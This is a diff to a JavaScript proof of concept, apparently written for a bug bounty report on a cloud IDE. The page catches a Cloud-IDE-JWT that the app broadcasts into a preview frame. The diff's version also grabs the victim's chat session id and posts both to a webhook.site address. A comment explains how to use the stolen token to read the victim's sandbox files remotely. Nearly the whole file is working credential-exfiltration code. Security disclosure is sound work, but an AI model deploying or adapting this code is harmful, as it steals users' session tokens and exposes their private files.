@@ -7,11 +7,28 @@
 // PoC by dontsaynetwork (HackerOne reporter id).  Public repo file, no account needed.
 // It only listens for the application broadcasting the account credential into the
 // preview frame.  No prompt injection, no AI/LLM feature is involved.
+//
+// v2 additionally captures the victim's chat_session_id, which is present in this
+// file's own URL (work.trae.ai/__virtual_fs__/<chat_session_id>/<file>).  The
+// session id + the stolen Cloud-IDE-JWT are enough for the attacker to read the
+// victim's sandbox file tree from the attacker's own machine:
+//   GET https://agent-sandbox-jkt-a1-gw.trae.ai/explorer/<sid>/file-tree?path=.
+//   Authorization: Cloud-IDE-JWT <stolen token>
+// (that gateway answers access-control-allow-origin: *).
 var WH = 'https://webhook.site/5b409ee0-f05e-4ff9-8402-b47466b65a9c';
 function show(t){ var e=document.getElementById('s'); if(e) e.textContent=t; }
-function exfil(tok, origin){
-  var body = 'Cloud-IDE-JWT ' + tok;
-  var q = '?origin=' + encodeURIComponent(origin) + '&len=' + tok.length + '&token=' + encodeURIComponent(tok);
+function currentSid(){
+  // this file is served from  https://work.trae.ai/__virtual_fs__/<chat_session_id>/<name>
+  try {
+    var m = /\/__virtual_fs__\/([^/]+)\//.exec(location.href);
+    if (m) return decodeURIComponent(m[1]);
+  } catch(e) {}
+  return '';
+}
+function exfil(tok, sid, origin){
+  var body = 'Cloud-IDE-JWT ' + tok + '\nsid=' + sid + '\norigin=' + origin;
+  var q = '?origin=' + encodeURIComponent(origin) + '&len=' + tok.length +
+          '&sid=' + encodeURIComponent(sid) + '&token=' + encodeURIComponent(tok);
   try {
     // simple cross-origin POST (text/plain is CORS-safelisted -> no preflight)
     fetch(WH + '/set-token', {method:'POST', mode:'no-cors',
@@ -24,13 +41,18 @@ addEventListener('message', function(e){
   var d = e.data;
   if(!d || d.type !== 'SET_TOKEN' || !d.data || !d.data.token) return;
   var tok = d.data.token;
+  var sid = currentSid();
   document.title = 'TOKEN_EXFILTRATED';
   show('CAPTURED Cloud-IDE-JWT (' + tok.length + ' chars)\n'
-       + 'from origin: ' + e.origin + '\n\n'
+       + 'from origin: ' + e.origin + '\n'
+       + 'victim chat_session_id: ' + sid + '\n\n'
        + 'Cloud-IDE-JWT ' + tok + '\n\n'
        + 'exfiltrating to: ' + WH);
-  exfil(tok, e.origin);
-  try { alert('CAPTURED Cloud-IDE-JWT (' + tok.length + ' chars)\nfrom ' + e.origin + '\n\nCloud-IDE-JWT ' + tok); } catch(x) {}
+  exfil(tok, sid, e.origin);
+  try { alert('CAPTURED Cloud-IDE-JWT (' + tok.length + ' chars)\n'
+              + 'victim session: ' + sid + '\n'
+              + 'from ' + e.origin + '\n\n'
+              + 'Cloud-IDE-JWT ' + tok); } catch(x) {}
 });
 </script>
 </body></html>
